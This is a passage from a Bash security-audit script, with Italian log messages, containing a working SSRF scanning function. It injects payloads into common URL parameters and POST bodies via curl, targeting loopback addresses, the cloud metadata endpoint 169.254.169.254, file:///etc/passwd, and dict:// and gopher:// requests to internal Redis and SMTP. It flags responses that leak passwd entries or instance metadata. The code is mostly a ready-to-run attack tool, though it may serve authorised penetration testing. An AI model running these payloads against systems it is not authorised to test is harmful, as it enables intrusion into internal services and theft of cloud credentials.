    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_ssrf; exit 1; }
    validate_target "$target"
    check_root
    setup_outdir "$target" "ssrf"
    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"

    local base_url="${scheme}://${target}:${port}"
    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"

    local -a _params=("url" "dest" "redirect" "uri" "path" "src" "href" "proxy"
                      "callback" "next" "return" "returnTo" "continue" "target"
                      "site" "img" "image" "ref" "fetch" "load" "open" "to"
                      "file" "page" "view" "navigate" "forward" "go")
    local -a _ssrf_payloads=(
        "http://127.0.0.1/"
        "http://localhost/"
        "http://0.0.0.0/"
        "http://169.254.169.254/latest/meta-data/"
        "http://[::1]/"
        "http://2130706433/"
        "http://0177.0.0.1/"
        "file:///etc/passwd"
        "dict://127.0.0.1:6379/info"
        "gopher://127.0.0.1:25/_HELO%20ssrf"
    )

    section "SSRF — Probe su parametri comuni"
    local _ssrf_found=0
    if [[ $DRY_RUN -eq 0 ]]; then
        for _param in "${_params[@]:0:15}"; do
            for _ssrf_pl in "${_ssrf_payloads[@]:0:5}"; do
                local _resp _enc_pl
                _enc_pl=$(printf '%s' "$_ssrf_pl" | python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || printf '%s' "$_ssrf_pl")
                _resp=$(curl -s $insecure --max-time 8 \
                    "${base_url}/?${_param}=${_enc_pl}" 2>/dev/null | head -50 || true)
                echo "=== ${_param}=${_ssrf_pl} ===" >> "$OUTDIR/ssrf_probe.txt"
                echo "$_resp" | head -10             >> "$OUTDIR/ssrf_probe.txt"
                if echo "$_resp" | grep -qiE "ami-|instance-id|meta-data|root:|localhost|127\.0\.0\.1|redis_version|\+OK"; then
                    found CRITICAL "SSRF confermato — parametro '${_param}' con payload: ${_ssrf_pl}"
                    echo "SSRF: param=${_param} payload=${_ssrf_pl}" >> "$OUTDIR/ssrf_confirmed.txt"
                    echo "$_resp" >> "$OUTDIR/ssrf_confirmed.txt"
                    _ssrf_found=1
                fi
            done
        done
        [[ $_ssrf_found -eq 0 ]] && log "SSRF: nessuna vulnerabilità rilevata sui parametri testati"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} SSRF probe: ${#_params[@]} parametri x ${#_ssrf_payloads[@]} payload su $base_url"
    fi

    section "SSRF — POST body injection"
    if [[ $DRY_RUN -eq 0 ]]; then
        for _param in "url" "dest" "redirect" "proxy" "callback"; do
            local _resp
            _resp=$(curl -s $insecure --max-time 8 -X POST \
                -d "${_param}=http://127.0.0.1/" \
                "${base_url}/" 2>/dev/null | head -20 || true)
            if echo "$_resp" | grep -qiE "root:|localhost|127\.0\.0\.1|Connection refused|ECONNREFUSED"; then
                found HIGH "SSRF via POST — parametro '${_param}' riflette risposta interna"
                _ssrf_found=1
            fi
        done
    fi

    ok "SSRF audit completato → $OUTDIR"
}

